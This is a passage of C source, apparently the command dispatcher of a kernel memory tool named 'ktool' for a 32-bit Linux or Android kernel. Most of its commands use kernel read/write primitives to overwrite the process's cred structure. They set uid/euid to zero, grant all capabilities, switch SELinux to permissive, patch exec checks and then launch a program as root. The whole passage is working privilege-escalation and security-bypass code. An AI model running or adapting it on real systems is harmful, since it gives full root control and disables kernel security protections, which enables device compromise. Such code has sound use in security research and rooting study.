		printf("%08lx <= %08x (was %08x)\n", a, v, *(uint32_t *)b);
		return 0;
	}

	if (!strcmp(argv[1], "setids")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t ru = strtoul(argv[2], NULL, 0), eu = strtoul(argv[3], NULL, 0);
		uint32_t ids[8];

		p2 = find_self();
		if (!p2) { printf("task not found\n"); return 3; }
		if (kread(p2 + 0x2f8, b, 64) != 0) return 3;
		c2 = *(uint32_t *)(b + 4);
		ids[0] = ids[1] = ids[2] = ids[3] = ru;
		ids[4] = ids[5] = ids[6] = ids[7] = eu;
		if (kwrite_verify(c2 + 4, ids, 32) != 0) { printf("write fail\n"); return 3; }
		printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		if (argc > 4) {
			struct stat st;
			int fd;

			if (stat(argv[4], &st) == 0)
				printf("stat: mode=%o uid=%d gid=%d\n",
				       (unsigned)st.st_mode, (int)st.st_uid, (int)st.st_gid);
			else
				printf("stat errno=%d\n", errno);
			errno = 0;
			fd = open(argv[4], O_RDONLY);
			printf("open=%d errno=%d\n", fd, errno);
			if (fd >= 0) close(fd);
			fflush(stdout);
			stop = 1;
			usleep(300000);
			execvp(argv[4], &argv[4]);
			printf("exec errno=%d\n", errno);
		}
		return 0;
	}

	if (!strcmp(argv[1], "snr")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t sb = 1, ids[8] = {0}, full[2] = {0xffffffffU, 0xffffffffU};
		int k;

		p2 = find_self();
		if (!p2) { printf("task not found\n"); return 3; }
		if (kread(p2 + 0x2f8, b, 64) != 0) return 3;
		c2 = *(uint32_t *)(b + 4);
		kwrite_verify(c2 + 0x24, (uint32_t[]){1, 0}, 8);
		(void)sb;
		kwrite_verify(c2 + 0x28, full, 8);
		kwrite_verify(c2 + 0x30, full, 8);
		kwrite_verify(c2 + 0x38, full, 8);
		for (k = 0; k < 8; k++) ids[k] = 0;
		kwrite_verify(c2 + 4, ids, 32);
		printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		if (argc > 2) {
			execvp(argv[2], &argv[2]);
			printf("exec errno=%d\n", errno);
		}
		return 0;
	}

	if (!strcmp(argv[1], "caps")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t f = 0xffffffffU;
		uint32_t offs[] = {0x28,0x2c,0x30,0x34,0x38,0x3c,0x40,0x44};
		uint32_t save[8];
		int k;

		p2 = find_self();
		if (!p2) { printf("task not found\n"); return 3; }
		if (kread(p2 + 0x2f8, b, 64) != 0) return 3;
		c2 = *(uint32_t *)(b + 4);
		printf("cred=%08lx\n", c2);
		show_caps("before");
		for (k = 0; k < 8; k++) {
			uint32_t pair[2];

			if (kread(c2 + offs[k], b, 8) != 0) continue;
			save[k] = *(uint32_t *)b;
			pair[0] = f;
			pair[1] = *(uint32_t *)(b + 4);   /* 保留相邻 4 字节 */
			if (kwrite_verify(c2 + offs[k], pair, 8) != 0) {
				printf("  +%02x write fail\n", offs[k]);
				continue;
			}
			printf("  +%02x was %08x -> ", offs[k], save[k]);
			show_caps("    ");
			pair[0] = save[k];
			if (kwrite_verify(c2 + offs[k], pair, 8) != 0)
				printf("  restore fail\n");
		}
		show_caps("after");
		return 0;
	}

	if (!strcmp(argv[1], "patch")) {
		if (do_root() != 0) return 3;
		return do_patch_exec(1) == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "unpatch")) {
		if (do_root() != 0) return 3;
		return do_patch_exec(0) == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "stat")) {
		show_mem("before");
		show_audit("before");
		if (do_root() != 0) { printf("root fail\n"); return 3; }
		show_mem("after-root");
		if (do_permissive() != 0) { printf("permissive fail\n"); return 3; }
		if (do_patch_exec(1) != 0) return 3;
		show_mem("after-perm");
		show_audit("after-perm");
		fflush(stdout);
		sleep(3);
		show_mem("t+3s");
		show_audit("t+3s");
		fflush(stdout);
		sleep(10);
		show_mem("t+13s");
		show_audit("t+13s");
		return 0;
	}

	if (!strcmp(argv[1], "unperm")) {
		if (do_root() != 0) return 3;
		return do_unperm() == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "restore")) {
		if (do_root() != 0) return 3;
		if (do_patch_exec(0) != 0) return 3;
		if (do_unperm() != 0) return 3;
		printf("restored: exec patch off, permissive off, modprobe_path ok\n");
		return 0;
	}

	if (!strcmp(argv[1], "permissive")) {
		return do_permissive() == 0 ? 0 : 3;
	}

	if (!strcmp(argv[1], "showcred")) {
		unsigned char b[64];
		unsigned long p, ih = 0xc0b79be0UL, cred = 0;
		uint32_t next;
		int i;

		if (kread(ih + 0x1c0, b, 64) != 0) return 2;
		next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
		for (i = 0; i < 400 && next; i++) {
			p = next - 0x1d0;
			if (kread(p + 0x300, b, 64) == 0 &&
			    !strncmp((char *)(b + 4), "ktool", 5)) break;
			if (kread(p + 0x1c0, b, 64) != 0) return 2;
			next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
			if (next == ih + 0x1d0) { next = 0; break; }
			if (i > 390) break;
		}
		if (!next) { printf("not found\n"); return 2; }
		if (kread(p + 0x2f8, b, 64) != 0) return 2;
		cred = *(uint32_t *)(b + 4);
		printf("task=%08lx cred=%08lx\n", p, cred);
		for (i = 0; i < 0x80; i += 8) {
			if (kread(cred + i, b, 8) != 0) { printf("+%02x fail\n", i); continue; }
			printf("  +%02x: %08x %08x\n", i, *(uint32_t *)b, *(uint32_t *)(b+4));
		}
		for (i = 0x48; i < 0x68; i += 4) {
			uint32_t v;
			unsigned char c[16];
			if (kread(cred + i, b, 8) != 0) continue;
			v = *(uint32_t *)b;
			if (v < 0xc0000000UL) continue;
			printf("ptr +%02x=%08x ->", i, v);
			if (kread(v, c, 16) == 0)
				printf(" %08x %08x %08x %08x\n",
				       *(uint32_t *)c, *(uint32_t *)(c+4),
				       *(uint32_t *)(c+8), *(uint32_t *)(c+12));
			else printf(" (read fail)\n");
		}
		return 0;
	}

	if (!strcmp(argv[1], "selftest")) {
		unsigned char b[64];
		unsigned long a = strtoul(argv[2], NULL, 16);
		int k;
		for (k = 0; k < 4; k++) {
			if (kread(a, b, 64) != 0) printf("read %d FAIL\n", k);
			else printf("read %d: %08x %08x %08x %08x\n", k,
				    *(uint32_t *)b, *(uint32_t *)(b+4),
				    *(uint32_t *)(b+8), *(uint32_t *)(b+12));
			fflush(stdout);
		}
		return 0;
	}

	if (!strcmp(argv[1], "dump")) {
		unsigned char buf[256];
		int off;

		for (off = 0; off < len; off += 64) {
			int n = (len - off > 64) ? 64 : (len - off);
			if (kread(addr + off, buf, n) != 0) {
				printf("%08lx  <read failed>\n", addr + off);
				fflush(stdout);
				continue;
			}
			printf("%08lx ", addr + off);
			for (i = 0; i < n; i++) {
				printf("%02x", buf[i]);
				if ((i & 3) == 3) printf(" ");
			}
			printf("\n");
			fflush(stdout);
		}
	} else {
		unsigned char *buf = malloc(len);
		if (!buf) return 1;
		if (kread(addr, buf, (len > MAXW ? MAXW : len)) != 0) {
			fprintf(stderr, "read failed\n");
			return 2;
		}
		fwrite(buf, 1, (len > MAXW ? MAXW : len), stdout);
	}
	return 0;
}
